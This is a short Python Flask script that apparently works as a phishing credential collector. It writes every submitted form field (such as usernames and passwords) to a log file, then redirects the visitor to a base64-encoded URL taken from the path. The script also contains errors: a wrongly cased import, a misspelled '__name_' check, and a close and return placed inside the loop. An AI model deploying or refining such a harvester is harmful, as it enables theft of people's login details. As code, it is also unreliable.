from flask import flask
from flask import request
from flask import redirect

from base64 import b64decode as decode


app = Flask(__name__)


@app.route("/<url>", methods=["POST", "GET"])
def index(url):
    f = open("log.txt", "a+")

    for key, value in request.form.items():
        f.write("{}: {}\n".format(key, value))
        f.write("==============\n")
        f.close()
        return redirect(decode(url))


if __name_ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=3000)